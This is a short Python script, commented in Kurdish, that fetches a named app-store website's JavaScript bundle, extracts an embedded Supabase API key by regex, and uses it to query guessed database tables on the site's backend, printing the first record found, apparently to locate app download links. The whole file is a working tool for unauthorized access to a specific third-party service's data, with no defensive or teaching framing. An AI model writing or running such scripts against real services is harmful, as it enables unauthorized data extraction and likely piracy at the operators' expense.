import requests
import re
import json

print("=== UNLOCKING SUPABASE DATABASE ===")
js_url = "https://tryipa.com/assets/index-Jb0mx1SV.js"

try:
    res = requests.get(js_url, timeout=15)
    
    # دۆزینەوەی کلیلە شاراوەکە (Supabase Anon Key کە بە eyJ دەست پێدەکات)
    match = re.search(r'["\'](eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)["\']', res.text)
    
    if not match:
        print("Could not find the API key in the JS file.")
        exit()
        
    api_key = match.group(1)
    print("-> Successfully extracted the secret API key!")
    
    # ئامادەکردنی پاسپۆرتەکە بۆ چوونە ناو داتابەیسەکە
    headers = {
        "apikey": api_key,
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    # ناوی ئەو خشتانەی کە ئەگەر زۆرە یارییەکانی تێدا بێت
    tables = ["apps", "ipas", "library", "games", "tryplus_apps", "app_store", "ipa_library"]
    base_url = "https://supapi.trystore.net/rest/v1"
    
    for table in tables:
        url = f"{base_url}/{table}?select=*"
        print(f"\nTesting table: {table} ...")
        
        r = requests.get(url, headers=headers, timeout=10)
        print(f" -> Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            print(f" -> BINGO! Found {len(data)} apps in this table.")
            if len(data) > 0:
                print("\n--- FIRST APP DATA ---")
                # پیشاندانی یەکەم یاری بۆ ئەوەی بزانین لینکی داونلۆدەکەی ناوی چییە
                print(json.dumps(data[0], indent=2, ensure_ascii=False))
            break
            
except Exception as e:
    print(f"Error: {e}")

print("\n=== UNLOCK FINISHED ===")
